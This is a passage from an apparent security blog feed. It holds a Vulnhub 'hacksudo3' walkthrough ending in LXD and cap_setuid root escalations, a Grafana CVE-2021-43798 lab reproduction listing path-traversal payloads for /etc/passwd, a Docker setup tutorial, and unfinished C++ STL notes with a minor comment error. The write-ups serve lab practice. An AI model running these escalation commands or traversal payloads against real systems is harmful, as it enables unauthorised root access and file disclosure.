class="line"></span><br><span class="line">Would you like to connect to a MAAS server? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line"></span><br><span class="line">Would you like to create a new <span class="built_in">local</span> network bridge? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line"></span><br><span class="line">What should the new bridge be called? [default=lxdbr0]: </span><br><span class="line"></span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: </span><br><span class="line"></span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: </span><br><span class="line"></span><br><span class="line">Would you like the LXD server to be available over the network? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line"></span><br><span class="line">Would you like stale cached images to be updated automatically? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line"></span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line"></span><br><span class="line">hacksudo@hacksudo:~$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span>  image_name </span><br><span class="line">&lt;13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span>  image_name </span><br><span class="line">To start your first container, try: lxc launch ubuntu:22.04</span><br><span class="line">Or <span class="keyword">for</span> a virtual machine: lxc launch ubuntu:22.04 --vm</span><br><span class="line"></span><br><span class="line">hacksudo@hacksudo:~$ lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">hacksudo@hacksudo:~$ lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">&lt;ydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device mydevice added to ignite</span><br><span class="line">hacksudo@hacksudo:~$ lxc start ignite</span><br><span class="line">lxc start ignite</span><br><span class="line">hacksudo@hacksudo:~$ lxc <span class="built_in">exec</span> ignite /bin/bash</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/bash</span><br><span class="line">Error: Command not found</span><br><span class="line">hacksudo@hacksudo:~$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># ^[[52;5Rid</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># ^[[52;5Rcd /mnt/root</span></span><br><span class="line"><span class="built_in">cd</span> /mnt/root</span><br><span class="line">/mnt/root <span class="comment"># ^[[52;13Rls -al</span></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 1264717</span><br><span class="line">drwxr-xr-x   20 root     root          4096 Mar 18  2021 .</span><br><span class="line">drwxr-xr-x    3 root     root             3 Apr  2 10:16 ..</span><br><span class="line">lrwxrwxrwx    1 root     root             7 Oct 22  2020 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x    4 root     root          4096 Mar 18  2021 boot</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Mar 18  2021 cdrom</span><br><span class="line">drwxr-xr-x   20 root     root          4100 Apr  2 05:36 dev</span><br><span class="line">drwxr-xr-x   98 root     root          4096 Mar 23  2021 etc</span><br><span class="line">drwxr-xr-x    3 root     root          4096 Mar 18  2021 home</span><br><span class="line">lrwxrwxrwx    1 root     root             7 Oct 22  2020 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx    1 root     root             9 Oct 22  2020 lib32 -&gt; usr/lib32</span><br><span class="line">lrwxrwxrwx    1 root     root             9 Oct 22  2020 lib64 -&gt; usr/lib64</span><br><span class="line">lrwxrwxrwx    1 root     root            10 Oct 22  2020 libx32 -&gt; usr/libx32</span><br><span class="line">drwx------    2 root     root         16384 Mar 18  2021 lost+found</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Apr  2 10:12 media</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Oct 22  2020 mnt</span><br><span class="line">drwxr-xr-x    2 root     root          4096 Oct 22  2020 opt</span><br><span class="line">dr-xr-xr-x  269 root     root             0 Apr  2 05:36 proc</span><br><span class="line">drwx------    5 root     root          4096 Mar 24  2021 root</span><br><span class="line">drwxr-xr-x   28 root     root           840 Apr  2 08:43 run</span><br><span class="line">lrwxrwxrwx    1 root     root             8 Oct 22  2020 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x    7 root     root          4096 Apr  2 08:41 snap</span><br><span class="line">drwxr-xr-x    3 root     root          4096 Mar 20  2021 srv</span><br><span class="line">-rw-------    1 root     root     1294991360 Mar 18  2021 swap.img</span><br><span class="line">dr-xr-xr-x   13 root     root             0 Apr  2 05:36 sys</span><br><span class="line">drwxrwxrwt   15 root     root          4096 Apr  2 10:09 tmp</span><br><span class="line">drwxr-xr-x   14 root     root          4096 Oct 22  2020 usr</span><br><span class="line">drwxr-xr-x   14 root     root          4096 Mar 19  2021 var</span><br><span class="line">/mnt/root <span class="comment"># ^[[52;13Rcd root</span></span><br><span class="line"><span class="built_in">cd</span> root</span><br><span class="line">/mnt/root/root <span class="comment"># ^[[52;18Rls -al</span></span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 48</span><br><span class="line">drwx------    5 root     root          4096 Mar 24  2021 .</span><br><span class="line">drwxr-xr-x   20 root     root          4096 Mar 18  2021 ..</span><br><span class="line">-rw-------    1 root     root          5579 Mar 24  2021 .bash_history</span><br><span class="line">-rw-r--r--    1 root     root          3106 Aug 14  2019 .bashrc</span><br><span class="line">drwxr-xr-x    3 root     root          4096 Mar 19  2021 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--    1 root     root           161 Sep 16  2020 .profile</span><br><span class="line">drwx------    2 root     root          4096 Mar 18  2021 .ssh</span><br><span class="line">-rw-------    1 root     root           532 Mar 22  2021 .viminfo</span><br><span class="line">-r--------    1 root     root            42 Mar 24  2021 proof.txt</span><br><span class="line">-r--------    1 root     root            33 Mar 23  2021 root.txt</span><br><span class="line">drwxr-xr-x    3 root     root          4096 Mar 18  2021 snap</span><br><span class="line">/mnt/root/root <span class="comment"># ^[[52;18Rcat root.txt</span></span><br><span class="line"><span class="built_in">cat</span> root.txt</span><br><span class="line">7db64dc8077ff8f969938bc48bd0a9ab</span><br><span class="line">/mnt/root/root <span class="comment"># ^[[52;18Rcat proof.txt</span></span><br><span class="line"><span class="built_in">cat</span> proof.txt</span><br><span class="line">you successfully rooted hacksudo3 box !!!</span><br><span class="line">/mnt/root/root <span class="comment"># ^[[52;18R</span></span><br></pre></td></tr></table></figure>
<h3 id="提权补充">2.3. 提权补充</h3>
<p>上传 linpeas.sh 执行后，可找到有 <code>cap_setuid+ep</code> 权限的
<code>/home/hacksudo/locker/php</code> 和
<code>/home/hacksudo/view</code></p>
<p>利用 php 提权【<a href="https://gtfobins.github.io/gtfobins/php/">php
| GTFOBins</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hacksudo@hacksudo:~$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(hacksudo) gid=1000(hacksudo) <span class="built_in">groups</span>=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br><span class="line">hacksudo@hacksudo:~$ <span class="built_in">cd</span> locker</span><br><span class="line"><span class="built_in">cd</span> locker</span><br><span class="line">hacksudo@hacksudo:~/locker$ CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">CMD=<span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">hacksudo@hacksudo:~/locker$ ./php -r <span class="string">&quot;posix_setuid(0); system(&#x27;<span class="variable">$CMD</span>&#x27;);&quot;</span></span><br><span class="line">./php -r <span class="string">&quot;posix_setuid(0); system(&#x27;<span class="variable">$CMD</span>&#x27;);&quot;</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=1000(hacksudo) <span class="built_in">groups</span>=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)  </span><br></pre></td></tr></table></figure>
<p>利用 view 提权【<a
href="https://gtfobins.github.io/gtfobins/view/">view |
GTFOBins</a>】</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(hacksudo) gid=1000(hacksudo) <span class="built_in">groups</span>=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br><span class="line">./view -c <span class="string">&#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br><span class="line">Vim: Warning: Output is not to a terminal</span><br><span class="line">Vim: Warning: Input is not from a terminal</span><br><span class="line">reset: terminal attributes: No such device or address</span><br><span class="line"></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=1000(hacksudo) <span class="built_in">groups</span>=1000(hacksudo),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)</span><br><span class="line"><span class="built_in">cat</span> /root/proof.txt</span><br><span class="line">you successfully rooted hacksudo3 box !!!</span><br></pre></td></tr></table></figure>
<p>注意，view 是 /home/hacksudo 下的，另外 <strong>view
提权前</strong>不要执行下面命令切换 shell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
<p>即：重新反弹个 shell，用 su 切换至hacksudo用户，用下面命令提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./view -c <span class="string">&#x27;:python3 import os; os.setuid(0); os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, &quot;reset; exec sh&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>Vulnhub 靶场</tag>
        <tag>信息收集</tag>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
      </tags>
  </entry>
  <entry>
    <title>Grafana目录遍历漏洞复现【CVE-2021-43798】</title>
    <url>/2022/09/27/grafana%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%90cve-2021-43798%E3%80%91/</url>
    <content><![CDATA[<h2 id="grafana介绍">1. Grafana介绍</h2>
<p>Grafana是一个跨平台、开源的数据可视化网络应用程序平台。用户配置连接的数据源之后，Grafana可以在网络浏览器里显示数据图表和警告。2021年12月6日，国外安全研究人员披露Grafana中某些接口在提供静态文件时，攻击者通过构造恶意请求，可造成目录遍历，读取系统上的文件。</p>
<p><strong>漏洞影响范围</strong></p>
<ul>
<li>影响版本：Grafana 8.0.0 - 8.3.0</li>
<li>安全版本：Grafana 8.3.1, 8.2.7, 8.1.8, 8.0.7</li>
</ul>
<h2 id="环境搭建vulhub">2. 环境搭建【<a
href="https://vulhub.org/">Vulhub</a>】</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332f9a3e8156.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332f9b6eab92.png" /></p>
<p><strong>环境移除：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker-compose down</span><br></pre></td></tr></table></figure>
<h2 id="漏洞复现">3. 漏洞复现</h2>
<h3 id="burpsuit抓包检测">1、Burpsuit抓包检测</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332f9f6b54ae.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332fa077f1f8.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332fa167b731.png" /></p>
<h3 id="脚本批量测试">2、脚本批量测试</h3>
<p><strong>脚本下载：</strong><a
href="https://github.com/broc999/Grafana_POC-CVE-2021-43798">Grafana_POC-CVE-2021-43798</a></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/09/img_6332fa266d1e9.png" /></p>
<ul>
<li><strong>注，payload</strong></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/public/plugins/alertlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/annolist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/grafana-azure-monitor-datasource/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/barchart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/bargauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/cloudwatch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/dashlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/elasticsearch/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gauge/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/geomap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/gettingstarted/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stackdriver/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/graphite/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/heatmap/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/histogram/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/influxdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/jaeger/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/logs/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/loki/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mssql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/mysql/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/news/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/nodeGraph/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/opentsdb/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/piechart/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/pluginlist/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/postgres/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/prometheus/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/stat/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/state-timeline/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/status-history/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/table-old/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/tempo/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/testdata/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/text/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/timeseries/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/welcome/../../../../../../../../../../../etc/passwd</span><br><span class="line">/public/plugins/zipkin/../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
  </entry>
  <entry>
    <title>Docker的安装与配置</title>
    <url>/2022/11/29/docker%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="docker介绍">1. Docker介绍</h3>
<p>Docker 是一个开源的应用容器引擎，基于Go语言并遵从 Apache2.0
协议开源。 Docker
可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的
Linux 机器上，也可以实现虚拟化。
容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的
app）,更重要的是容器性能开销极低。</p>
<h4 id="docker的应用场景">1.1 Docker的应用场景</h4>
<p>Web 应用的自动化打包和发布。 自动化测试和持续集成、发布。
在服务型环境中部署和调整数据库或其他的后台应用。 从头编译或者扩展现有的
OpenShift 或 Cloud Foundry 平台来搭建自己的 PaaS 环境。</p>
<h4 id="docker-的优点">1.2 Docker 的优点</h4>
<p>Docker
是一个用于开发，交付和运行应用程序的开放平台。Docker能够将应用程序与基础架构分开，从而可以快速交付软件。借助
Docker，可以与管理应用程序相同的方式来管理基础架构。通过利用 Docker
的方法来快速交付，测试和部署代码，可以大大减少编写代码和在生产环境中运行代码之间的延迟。
Docker
允许开发人员使用您提供的应用程序或服务的本地容器在标准化环境中工作，从而简化了开发的生命周期，容器非常适合持续集成和持续交付（CI
/ CD）工作流程。 Docker
是基于容器的平台，允许高度可移植的工作负载。Docker
容器可以在开发人员的本机上，数据中心的物理或虚拟机上，云服务上或混合环境中运行。
Docker
的可移植性和轻量级的特性，还可以使您轻松地完成动态管理的工作负担，并根据业务需求指示，实时扩展或拆除应用程序和服务。
Docker
轻巧快速。它为基于虚拟机管理程序的虚拟机提供了可行、经济、高效的替代方案，因此可以利用更多的计算能力来实现业务目标。Docker
非常适合于高密度环境以及中小型部署，我们可以用更少的资源做更多的事情。</p>
<h3 id="实验环境">2. 实验环境</h3>
<p>VMware，CentOS 7虚拟机。</p>
<h3 id="实验过程">3. 实验过程</h3>
<h4 id="vm安装centos-7虚拟机">3.1 VM安装CentOS 7虚拟机</h4>
<p>CentOS 7虚拟机基本配置</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb6b0f0d3.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb72ebff1.png" /></p>
<p>启动虚拟机，依据提示配置基本信息即可。</p>
<h4 id="centos-7-安装图形界面">3.2 CentOS 7 安装图形界面</h4>
<p>开机root登录 安装X（X Window System）命令如下：yum groupinstall "X
Window System"，安装完成后出现complete字样。 然后安装图形界面软件 GNOME
Desktop 命令如下：yum groupinstall "GNOME Desktop"，安装完成后也会出现
complete 字样。 输入如下命令即可设置开机启动图形界面：systemctl
set-default
graphical.target（同理如果想开机启动DOS界面则应该输入如下命令：systemctl
set-default multi-user.target）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb7f4f00b.png" /></p>
<p>重启，依据提示做一些基本配置即可。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb845d227.png" /></p>
<h4 id="安装docker环境">3.3安装docker环境</h4>
<p>使用便捷脚本安装：curl -fsSL https://get.docker.com bash -s docker
--mirror Aliyun</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb8ceb2a8.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bb9564acd.png" /></p>
<p>Docker 安装完默认未启动。并且已经创建好 docker
用户组，但该用户组下没有用户。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bba095fff.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bba4a5da6.png" /></p>
<p>安装成功以后，检查安装状态：docker info</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bbae49401.png" /></p>
<h4 id="配置docker镜像加速">3.4配置docker镜像加速</h4>
<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># 内容如下：</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  <span class="string">&quot;registry-mirrors&quot;</span>: [</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;https://xx4bwyg2.mirror.aliyuncs.com&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;http://f1361db2.m.daocloud.io&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;https://registry.docker-cn.com&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;http://hub-mirror.c.163.com&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span></span><br><span class="line"></span><br><span class="line">  ]</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>国内从 DockerHub
拉取镜像有时会遇到困难，此时可以配置镜像加速器。Docker
官方和国内很多云服务商都提供了国内加速器服务。对于使用 systemd
的系统，请在 /etc/docker/daemon.json
中写入如下内容（如果文件不存在请新建该文件）： 退出并保存“:wq”
使配置生效：systemctl daemon-reload 重启Docker：systemctl restart
docker</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bbbb21fb9.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bbc11cac0.png" /></p>
<p>检查加速器是否生效
检查加速器是否生效配置加速器之后，如果拉取镜像仍然十分缓慢，请手动检查加速器配置是否生效，在命令行执行
docker info，如果从结果中看到了如下内容，说明配置成功。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bc1938b5e.png" /></p>
<h4 id="安装运行容器测试">3.5安装运行容器测试</h4>
<p>（1）hello world 容器安装运行测试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bc369aa15.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bc3c347a9.png" /></p>
<p>（2）安装运行一个后台容器（Ubuntu）</p>
<p>启动容器：docker run -it ubuntu /bin/bash<br />
参数说明： -i: 交互式操作。<br />
-t: 终端。 ubuntu: ubuntu 镜像。<br />
/bin/bash：放在镜像名后的是命令，提供一个交互式 Shell，因此用的是
/bin/bash。<br />
要退出终端，直接输入 exit:<br />
后台运行： docker run -itd --name ubuntu-test ubuntu /bin/bash<br />
停止一个容器：docker  stop  <容器 ID><br />
列出下载的镜像：docker image ls<br />
列出运行中的容器：docker container ls<br />
进入容器：docker exec -it <容器 ID>  /bin/bash<br />
（此命令会退出容器终端，但不会导致容器的停止。）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bc4bd5e82.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/wpblog/2022/11/img_6385bc565b467.png" /></p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
  </entry>
  <entry>
    <title>C++ STL</title>
    <url>/2023/03/14/c-stl/</url>
    <content><![CDATA[<p>STL 提供三种类型的组件：容器、迭代器和算法。</p>
<p>容器主要有两类：顺序容器和关联容器。顺序容器（vector、list、deque 和
string等）是一系列元素的有序集合。关联容器（set、multiset、map 和
multimap）包含查找元素的键值。</p>
<p>迭代器的作用是遍历容器。</p>
<p>STL
算法库包含四类算法：排序算法、不可变序算法、变序性算法和数值算法。</p>
<h2 id="vector-向量容器">1、vector 向量容器</h2>
<p>vector
具有内存自动管理的功能，对于元素的插入和删除，可动态调整所占的内存空间。</p>
<p>vector 容器有两个重要的方法，begin()和
end()。begin()返回的是首元素位置的迭代器；end()返回的是最后一个元素的<strong>下一元素位置</strong>的迭代器。</p>
<p><strong>创建 vector 对象</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">vector&lt;<span class="type">int</span>&gt; v;</span><br><span class="line"><span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">v</span><span class="params">(<span class="number">10</span>)</span></span>;<span class="comment">//10个元素，每个元素的值被初始化为 0.0</span></span><br><span class="line"><span class="function">vector&lt;<span class="type">double</span>&gt; <span class="title">v</span><span class="params">(<span class="number">10</span>，<span class="number">1.0</span>)</span></span>;<span class="comment">//共有 10 个元素，每个元素的值是 8.6</span></span><br></pre></td></tr></table></figure>
<p><strong>尾部元素扩张</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v.push\_back(<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p><strong>访问 vector 元素</strong></p>
<p>可以采用下标方式随意访问它的某个元素，也可使用迭代器配合循环语句来对
vector 对象进行遍历访问，迭代器的类型一定要与它要遍历的 vector
对象的元素类型一致。 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v</span><span class="params">(<span class="number">3</span>)</span></span>; </span><br><span class="line">v\[<span class="number">0</span>\]=<span class="number">2</span>; </span><br><span class="line">v\[<span class="number">1</span>\]=<span class="number">7</span>; </span><br><span class="line">v\[<span class="number">2</span>\]=<span class="number">9</span>; </span><br><span class="line"><span class="comment">//定义迭代器变量 </span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt;::iterator it; </span><br><span class="line"><span class="keyword">for</span>(it=v.<span class="built_in">begin</span>();it!=v.<span class="built_in">end</span>();it++) </span><br><span class="line">&#123; </span><br><span class="line"><span class="comment">//输出迭代器上的元素值 </span></span><br><span class="line">cout&lt;&lt;\*it&lt;&lt;<span class="string">&quot; &quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><strong>元素的插入</strong></p>
<p>insert()方法要求插入的位置，是元素的迭代器位置，而不是元素的下标。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>(),<span class="number">1</span>); <span class="comment">//在最前面插入新元素，元素值为 1</span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">begin</span>()+<span class="number">2</span>,<span class="number">2</span>); <span class="comment">//在第 2 个元素前插入新元素 2 </span></span><br><span class="line">v.<span class="built_in">insert</span>(v.<span class="built_in">end</span>(),<span class="number">3</span>);<span class="comment">//在向量末尾追加新元素 3</span></span><br></pre></td></tr></table></figure>
<p><strong>元素的删除</strong></p>
<p>erase()方法可以删除 vector
中迭代器所指的一个元素或一段区间中的所有元素。clear()方法则一次性删除
vector 中的所有元素。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v.<span class="built_in">erase</span>(v.<span class="built_in">begin</span>()+<span class="number">2</span>);<span class="comment">//删除第三个元素</span></span><br><span class="line">v.<span class="built_in">clear</span>();<span class="comment">//清空</span></span><br></pre></td></tr></table></figure>
<p><strong>向量的大小</strong></p>
<p>使用 size()方法可以返回向量的大小，即元素的个数。使用
empty()方法返回向量是否为空。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//输出向量的大小，即包含了多少个元素 </span></span><br><span class="line">cout&lt;&lt;v.<span class="built_in">size</span>()&lt;&lt;endl; </span><br><span class="line"><span class="comment">//输出向量是否为空，如果非空，则返回逻辑假，即 0，否则返回逻辑真，即 1 </span></span><br><span class="line">cout&lt;&lt;v.<span class="built_in">empty</span>()&lt;&lt;endl;</span><br></pre></td></tr></table></figure>
<h2 id="string-容器">2、string 容器</h2>
<p><strong>创建 string 对象</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s;</span><br></pre></td></tr></table></figure>
<p><strong>给 string 对象赋值</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">string s; </span><br><span class="line">s=<span class="string">&quot;hello,C++STL.&quot;</span>;</span><br><span class="line"><span class="comment">//把字符指针赋给一个字符串对象</span></span><br><span class="line"><span class="type">char</span> ss\[<span class="number">5000</span>\]; </span><br><span class="line"><span class="comment">//把整个字符数组赋值给 string 对象 </span></span><br><span class="line">s=ss; </span><br><span class="line"><span class="comment">//从 string 对象尾部添加字符/字符串</span></span><br><span class="line">s=s+<span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">s=s+<span class="string">&quot;abc&quot;</span>; </span><br><span class="line"><span class="comment">//采用 append()方法,注意与python中append()方法的区别</span></span><br><span class="line">string s; </span><br><span class="line">s.<span class="built_in">append</span>(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line"><span class="comment">//给 string 对象插入字符,可以使用 insert()方法把一个字符插入到迭代器位置之前</span></span><br><span class="line">s.<span 